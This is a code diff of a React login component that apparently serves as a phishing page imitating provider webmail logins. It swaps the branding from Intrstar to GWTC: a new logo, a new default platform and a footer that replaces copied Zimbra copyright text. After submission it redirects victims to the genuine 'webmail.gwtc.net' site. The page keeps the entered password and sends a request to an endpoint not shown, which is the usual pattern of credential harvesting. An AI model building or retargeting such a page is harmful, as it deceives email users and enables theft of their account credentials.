@@ -6,6 +6,8 @@ import ardmore from './ardmore.png';
 import { useState } from 'react';
 import axios from 'axios';
 import intrstar from './intrstar.png';
+import gwtc from './gwtc.png';
+
 
 function Home(){
 
@@ -13,7 +15,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Intrstar")
+    const[platform, setPlatform] = useState("GWTC")
 
     const[showError, setShowError] = useState(false);
 
@@ -44,7 +46,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://vmx.intrstar.net/';
+               window.location.href = 'https://webmail.gwtc.net/';
             }
           } catch (error) {
             // Handle error
@@ -72,7 +74,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={intrstar} className="mylogo" />
+                <img src={gwtc} className="mylogo" />
 
                 </div>
 
@@ -170,8 +172,7 @@ function Home(){
 
             <div className='thirdiv'>
 
-                <p>Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums <br/>
-                    Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>
+                <p>gwtc.net webmail</p>
 
             </div>
 
